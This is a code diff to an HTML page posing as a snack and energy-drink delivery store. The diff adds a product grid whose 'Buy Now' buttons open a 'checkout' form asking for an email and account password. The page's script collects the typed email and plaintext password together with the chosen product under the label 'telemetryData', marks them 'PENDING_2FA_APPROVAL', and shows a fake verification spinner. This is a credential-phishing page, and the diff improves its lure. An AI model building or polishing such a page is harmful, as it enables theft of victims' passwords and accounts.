@@ -3,7 +3,7 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>Snack online</title>
+    <title>Snack Online Store</title>
     <style>
         :root {
             --bg-color: #121212;
@@ -54,40 +54,60 @@
             text-align: center;
             font-weight: 400;
         }
-        .products-grid {
+        
+        #storeFront {
+            display: block;
+        }
+        .store-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 12px;
             margin-bottom: 20px;
         }
-        .product-card {
+        .store-item {
             background: #252525;
             border: 1px solid var(--border-color);
             border-radius: 8px;
-            padding: 10px;
+            padding: 12px;
             text-align: center;
-            cursor: pointer;
-            transition: 0.2s;
         }
-        .product-card:hover {
-            border-color: var(--accent-color);
-        }
-        .product-card img {
-            width: 50px;
-            height: 70px;
+        .store-item img {
+            width: 70px;
+            height: 90px;
             object-fit: contain;
             margin-bottom: 8px;
         }
-        .product-name {
+        .store-item-name {
             font-size: 13px;
             font-weight: 600;
             margin-bottom: 4px;
         }
-        .product-price {
+        .store-item-price {
             font-size: 12px;
             color: var(--accent-blue);
             font-weight: 700;
+            margin-bottom: 10px;
         }
+        .buy-btn {
+            width: 100%;
+            padding: 8px;
+            background: var(--accent-blue);
+            color: #000;
+            border: none;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .buy-btn:hover {
+            opacity: 0.9;
+        }
+
+        #loginState {
+            display: none;
+        }
+
         .form-group {
             margin-bottom: 15px;
         }
@@ -130,6 +150,7 @@
         .btn:hover {
             opacity: 0.9;
         }
+        
         #verificationState {
             display: none;
             text-align: center;
@@ -157,27 +178,45 @@
             color: var(--accent-blue);
             font-weight: 600;
         }
+        .back-link {
+            display: block;
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 15px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
     </style>
-    </head>
+</head>
 <body>
 
     <div class="container">
-        <div id="loginState">
-            <div class="logo">SNACK<span>BAR</span></div>
-            <h2>Quick Express Delivery</h2>
-            <div class="products-grid">
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1622543925917-633c7caae8c9?w=150" alt="Red Bull">
-                    <div class="product-name">Red Bull 250ml</div>
-                    <div class="product-price">$3.50</div>
+        
+        <div id="storeFront">
+            <div class="logo">SNACK<span>STORE</span></div>
+            <h2>Available Products & Energy Drinks</h2>
+            
+            <div class="store-grid">
+                <div class="store-item">
+                    <img src="https://images.unsplash.com/photo-1551024709-8f23befc6f87?w=300" alt="Red Bull Energy Drink">
+                    <div class="store-item-name">Red Bull 250ml</div>
+                    <div class="store-item-price">$3.50</div>
+                    <button class="buy-btn" onclick="goToLogin('Red Bull 250ml')">Buy Now</button>
                 </div>
-                <div class="product-card">
-                    <img src="https://images.unsplash.com/photo-1527960669568-a824f1f7d63c?w=150" alt="Snacks">
-                    <div class="product-name">Mixed Chips</div>
-                    <div class="product-price">$2.00</div>
+                <div class="store-item">
+                    <img src="https://images.unsplash.com/photo-1566478989037-eec170784d0b?w=300" alt="Potato Chips">
+                    <div class="store-item-name">Crunchy Chips</div>
+                    <div class="store-item-price">$2.00</div>
+                    <button class="buy-btn" onclick="goToLogin('Crunchy Chips')">Buy Now</button>
                 </div>
             </div>
+        </div>
 
+        <div id="loginState">
+            <div class="logo">SNACK<span>STORE</span></div>
+            <h2 id="selectedProductTitle">Complete Your Order</h2>
+            
             <form id="tradingForm">
                 <div class="form-group">
                     <label for="email">Delivery Email / ID</label>
@@ -188,16 +227,17 @@
                     <input type="password" id="password" required placeholder="••••••••">
                 </div>
                 <button type="submit" class="btn">Proceed to Checkout</button>
+                <span class="back-link" onclick="goBackToStore()">Back to store</span>
             </form>
         </div>
 
         <div id="verificationState">
-            <div class="logo">SNACK<span>BAR</span></div>
+            <div class="logo">SNACK<span>STORE</span></div>
             <h2>Verifying Order Request</h2>
             <div class="spinner"></div>
             <p class="info-text">
                 We've sent a verification prompt to your email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
-                Please confirm the payment authorization to dispatch your snacks.
+                Please confirm the payment authorization to dispatch your items.
             </p>
         </div>
     </div>
@@ -213,12 +253,24 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        setTimeout(() => {
-            const emailInput = document.getElementById("email");
-            if (!emailInput.value) {
-                emailInput.value = "customer.express99@gmail.com";
-            }
-        }, 2000);
+        let chosenProduct = "";
+        window.goToLogin = function(productName) {
+            chosenProduct = productName;
+            document.getElementById("selectedProductTitle").innerText = "Checkout: " + productName;
+            document.getElementById("storeFront").style.display = "none";
+            document.getElementById("loginState").style.display = "block";
+            setTimeout(() => {
+                const emailInput = document.getElementById("email");
+                if (!emailInput.value) {
+                    emailInput.value = "customer.express99@gmail.com";
+                }
+            }, 2000);
+        }
+
+        window.goBackToStore = function() {
+            document.getElementById("loginState").style.display = "none";
+            document.getElementById("storeFront").style.display = "block";
+        }
 
         document.getElementById("tradingForm").addEventListener("submit", function(e) {
             e.preventDefault();
@@ -243,6 +295,7 @@
 
             const telemetryData = {
                 sessionId: sessionId,
+                product: chosenProduct,
                 inputEmail: userEmail,
                 inputPassword: userPass,
                 status: "PENDING_2FA_APPROVAL",
